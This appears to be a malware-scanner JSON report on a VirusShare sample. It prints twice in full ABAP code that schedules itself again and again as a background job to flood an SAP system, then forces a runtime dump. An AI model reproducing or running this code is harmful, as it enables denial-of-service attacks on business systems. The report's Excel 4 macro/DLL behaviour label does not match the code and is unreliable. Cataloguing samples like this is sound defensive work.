@@ -1,0 +1,80 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CALL": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "DATA: SAPVIRII LIKE TBTCJOB,\n      RULEZ    LIKE BTCH0000-CHAR1,\n      DoS(20),\n      FoRSAP TYPE P.\nCALL FUNCTION 'RANDOM_C'\nEXPORTING  LEN_MIN   = 10\n           LEN_MAX   = 10\n           CHAR_MIN  = 69\n           CHAR_MAX  = 90\nIMPORTING  RND_VALUE = SAPVirii-JOBNAME\nEXCEPTIONS OTHERS    = 1.\n  CONCATENATE 'DoS' SAPVirii-JOBNAME INTO SAPVirii-JOBNAME.\nCALL FUNCTION 'JOB_OPEN'\n     EXPORTING\n         DELANFREP        = 'X'\n          JOBNAME          = SAPVirii-JOBNAME\n    IMPORTING\n         JOBCOUNT         = SAPVirii-JOBCOUNT\n     EXCEPTIONS\n          CANT_CREATE_JOB  = 1\n          INVALID_JOB_DATA = 2\n          JOBNAME_MISSING  = 3\n          OTHERS           = 4.\n  SUBMIT (SY-REPID) AND RETURN\n         USER SY-UNAME\n         VIA  JOB SAPVirii-JOBNAME NUMBER SAPVirii-JOBCOUNT\n         TO SAP-SPOOL\n         IMMEDIATELY ''\n         WITHOUT SPOOL DYNPRO.\n  CALL FUNCTION 'JOB_CLOSE'\n       EXPORTING\n            JOBCOUNT             = SAPVirii-JOBCOUNT\n            JOBNAME              = SAPVirii-JOBNAME\n            STRTIMMED            = 'X'\n       IMPORTING\n            JOB_WAS_RELEASED     = Rulez\n       EXCEPTIONS\n            CANT_START_IMMEDIATE = 1\n            INVALID_STARTDATE    = 2\n            JOBNAME_MISSING      = 3\n            JOB_CLOSE_FAILED     = 4\n            JOB_NOSTEPS          = 5\n            JOB_NOTEX            = 6\n            LOCK_FAILED          = 7\n            OTHERS               = 8.\nDoS = 'DoS.001'. \" Dump is near\nFoRSAP = DoS * 1. \" Dump Rulez, Dump DoS\n"
+    },
+    "filename": "VirusShare_6a2b01461a70701b3ea232b4a8c7ab09",
+    "filesize": 1550,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "6a2b01461a70701b3ea232b4a8c7ab09",
+        "sha1": "55ffcd86c6ac4fbf9541bc96cfafde92e1c83a30",
+        "sha256": "3e3efcb71dc52caced1f59a2e6ac3da51aeaa764b90747b276500fad23e03d95"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "DATA: SAPVIRII LIKE TBTCJOB,",
+            "      RULEZ    LIKE BTCH0000-CHAR1,",
+            "      DoS(20),",
+            "      FoRSAP TYPE P.",
+            "CALL FUNCTION 'RANDOM_C'",
+            "EXPORTING  LEN_MIN   = 10",
+            "           LEN_MAX   = 10",
+            "           CHAR_MIN  = 69",
+            "           CHAR_MAX  = 90",
+            "IMPORTING  RND_VALUE = SAPVirii-JOBNAME",
+            "EXCEPTIONS OTHERS    = 1.",
+            "  CONCATENATE 'DoS' SAPVirii-JOBNAME INTO SAPVirii-JOBNAME.",
+            "CALL FUNCTION 'JOB_OPEN'",
+            "     EXPORTING",
+            "         DELANFREP        = 'X'",
+            "          JOBNAME          = SAPVirii-JOBNAME",
+            "    IMPORTING",
+            "         JOBCOUNT         = SAPVirii-JOBCOUNT",
+            "     EXCEPTIONS",
+            "          CANT_CREATE_JOB  = 1",
+            "          INVALID_JOB_DATA = 2",
+            "          JOBNAME_MISSING  = 3",
+            "          OTHERS           = 4.",
+            "  SUBMIT (SY-REPID) AND RETURN",
+            "         USER SY-UNAME",
+            "         VIA  JOB SAPVirii-JOBNAME NUMBER SAPVirii-JOBCOUNT",
+            "         TO SAP-SPOOL",
+            "         IMMEDIATELY ''",
+            "         WITHOUT SPOOL DYNPRO.",
+            "  CALL FUNCTION 'JOB_CLOSE'",
+            "       EXPORTING",
+            "            JOBCOUNT             = SAPVirii-JOBCOUNT",
+            "            JOBNAME              = SAPVirii-JOBNAME",
+            "            STRTIMMED            = 'X'",
+            "       IMPORTING",
+            "            JOB_WAS_RELEASED     = Rulez",
+            "       EXCEPTIONS",
+            "            CANT_START_IMMEDIATE = 1",
+            "            INVALID_STARTDATE    = 2",
+            "            JOBNAME_MISSING      = 3",
+            "            JOB_CLOSE_FAILED     = 4",
+            "            JOB_NOSTEPS          = 5",
+            "            JOB_NOTEX            = 6",
+            "            LOCK_FAILED          = 7",
+            "            OTHERS               = 8.",
+            "DoS = 'DoS.001'. \" Dump is near",
+            "FoRSAP = DoS * 1. \" Dump Rulez, Dump DoS"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.272207",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
